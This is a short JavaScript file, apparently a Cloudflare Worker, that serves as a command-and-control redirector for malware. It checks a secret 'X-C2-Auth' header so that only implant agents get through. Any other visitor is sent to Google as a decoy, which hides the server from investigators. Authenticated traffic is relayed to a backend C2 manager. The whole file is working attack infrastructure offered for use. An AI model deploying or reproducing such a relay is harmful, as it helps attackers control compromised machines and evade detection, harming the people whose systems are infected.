export default {
  async fetch(request, env) {
    // ============================================================
    // 1. Check the auth header – only agents with the secret can pass
    // ============================================================
    const authHeader = request.headers.get("X-C2-Auth");
    if (authHeader !== env.C2_AUTH) {
      // Invalid auth → return decoy (302 redirect to Google)
      return new Response(null, {
        status: 302,
        headers: { "Location": "https://www.google.com" },
      });
    }

    // ============================================================
    // 2. Forward the request to your Render manager
    // ============================================================
    const url = new URL(request.url);
    const backendUrl = env.BACKEND_URL + url.pathname + url.search;

    // Preserve the original request but change the destination
    const modifiedRequest = new Request(backendUrl, {
      method: request.method,
      headers: request.headers,
      body: request.body,
    });

    // ============================================================
    // 3. Forward and return the response
    // ============================================================
    try {
      const response = await fetch(modifiedRequest);
      return response;
    } catch (error) {
      console.error("Backend error:", error);
      return new Response("Backend C2 Unavailable", { status: 503 });
    }
  },
};